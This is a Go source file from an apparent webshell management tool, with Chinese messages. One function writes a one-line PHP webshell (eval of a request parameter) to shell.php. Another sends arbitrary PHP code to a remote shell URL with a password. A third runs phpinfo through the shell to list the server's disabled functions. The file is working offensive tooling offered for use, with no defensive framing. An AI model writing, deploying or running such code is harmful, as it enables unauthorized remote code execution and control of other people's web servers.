// Package php php.go
package php

import (
	"fmt"
	"io"
	"os"
	"regexp"
	"strings"
	"webshellManager/database"
	"webshellManager/http"
	"webshellManager/util"
)

func ExecuteCode(payload string) (*string, error) {
	database.SelectDb()
	evalPayload := fmt.Sprintf("%s=%s;", util.Passwd, payload)
	fmt.Println("这是payload:\t", evalPayload)
	respEval, err := http.MakeRequest(evalPayload, util.HttpURL, util.UserAgent)
	{
		util.HandleError(err, "发送payload失败!")
	}
	defer func(body io.ReadCloser) {
		err := body.Close()
		{
			util.HandleError(err, "关闭响应失败!")
		}
	}(respEval.Body)
	bodyEval, err := io.ReadAll(respEval.Body)
	{
		util.HandleError(err, "打印php响应失败! ")
	}
	bodyresp := string(bodyEval)
	if bodyresp != "" {
		fmt.Println("执行代码响应:")
		//fmt.Printf("%s", bodyEval)
	} else {
		fmt.Println("连接失败,请检查连接密码!")
	}
	//fmt.Println("执行代码响应:")
	return &bodyresp, nil
}

func GenerateWebShell() {
	text := `<?php eval($_REQUEST['shell']);`
	filename := `shell.php`
	file, err := os.Create(filename)
	{
		util.HandleError(err, "创建文件时出错!")
	}
	_, err = io.WriteString(file, text)
	{
		util.HandleError(err, "写入文件出错!")
	}
	fmt.Printf("生成文件成功!文件名:%s\n", filename)
}

func DisableFunctionInfo() {
	// 保存当前的标准输出
	oldStdout := os.Stdout

	// 创建一个黑洞，将标准输出重定向到黑洞
	null, _ := os.Create(os.DevNull)
	os.Stdout = null

	// 执行函数
	textPtr, err := ExecuteCode("phpinfo()")
	{
		util.HandleError(err, "执行phpinfo失败")
	}
	text := *textPtr
	// 在这里不会将输出打印到终端
	// 恢复标准输出
	os.Stdout = oldStdout

	re := regexp.MustCompile(`disable_functions</td><td class="v">(.*?)</td>`)
	matches := re.FindAllStringSubmatch(text, -1)
	// 提取匹配项的内容并输出
	for _, match := range matches {
		// 提取匹配项中的第一个子匹配组（即，<td class="v"> 和 </td> 之间的内容）
		content := match[1]
		//去空
		cleanedContent := strings.TrimSpace(content)
		fmt.Println("过滤了如下函数:\t", cleanedContent)
	}
}
